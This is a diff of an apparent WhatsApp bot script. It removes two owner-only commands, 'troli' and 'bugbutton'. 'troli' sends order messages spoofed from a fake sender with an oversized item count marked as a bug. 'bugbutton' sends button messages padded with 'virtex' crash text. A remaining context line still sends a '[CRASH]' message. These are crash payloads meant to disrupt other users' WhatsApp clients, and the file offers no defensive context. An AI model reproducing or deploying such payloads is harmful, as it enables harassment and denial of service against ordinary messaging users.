@@ -3615,67 +3615,7 @@ message: { "contactMessage": {
  "jpegThumbnail": fs.readFileSync('./menu1.jpeg')}}}
 hisoka.sendMessage(m.chat, {text:"HANZ々OFC彡 [CRASH]"},{quoted:fkon})
 break      
-case 'troli': {
-	if (!isCreator) return
-a = await hisoka.sendMessage(m.chat, {react: {  key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
-	let troli = generateWAMessageFromContent(m.chat,{
-	"orderMessage": {
-	"orderId": "599519108102353",
-	"thumbnail": fs.readFileSync('./menu1.jpeg'),
-	"itemCount": 2022,
-	"status": "INQUIRY",
-	"surface": "CATALOG",
-	"message": `Tes`,
-	"orderTitle": `Donk`, // 
-	"sellerJid": "6283131458282@s.whatsapp.net",
-	"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
-	}
-	},{quoted: {
-	key: {
-	fromMe: false,
-	participant: 
-	`0@s.whatsapp.net`, // Fake sender Jid
-	remoteJid: "status@broadcast"
-	},
-	message: {
-	orderMessage: {
-	itemCount: 999999999, // Bug
-	status: 1,
-	surface: 1,
-	message: '😈𝚃𝙷𝙴 𝙹𝙾 𝙱𝙾𝚃',
-	orderTitle: '999999999', // Idk what this does
-	sellerJid: `0@s.whatsapp.net` // Seller
-	}
-	}
-	}, contextInfo:{}}) 
-	hisoka.relayMessage(m.chat, troli.message, { messageId: troli.key.id, a})
-	}
-	break
-case 'bugbutton': 
-if(!isCreator) return m.reply("Khusus Owner")
-let buttons = [
-{buttonId: `Jembod`, buttonText:{displayText:`HANZ々OFC彡-${virtex1(prefix)}`,}, type: 1}
-                ]
-                let buttonMessage = {
-                    image: fs.readFileSync('./menu1.jpeg'),
-                    caption: `💤HANZ々OFC彡💤\n
-╭━━•›ꪶ ཻུ۪۪ꦽꦼ̷⸙ ━ ━ ━ ━ ꪶ ཻུ۪۪ꦽꦼ̷⸙‹•━━╮
-┃╭┈─────────────⩵꙰ཱི࿐
-┃╰── ⏤͟͟͞Script Bot──➤ ↶↷*
-╰•͙✩̣̣̣̣
-⁙┃〲◦➛Link Sc: https://bit.ly/3vJZJ7n
-⁙┃〲◦➛Link Donasi: https://saweria.co/harisnew
-⁙┃〲◦➛Link Instagram: https://www.instagram.com/wong_koclok_
-⁙┃〲◦➛Link You Tube: https://youtube.com/channel/UCfhWUHl7dskRCVlyDMxnQbw
-⁙╰•▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬
-${virtex1(prefix)}`,
-                    footer: virtex1,
-                    buttons: buttons,
-                    headerType: 4
-                }
-                hisoka.sendMessage(m.chat, buttonMessage, { quoted: m })
-            }
-            break
+
 case 'sendreaksi' :
 if(!isCreator) return m.reply("Khusus Owner") 
                 Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
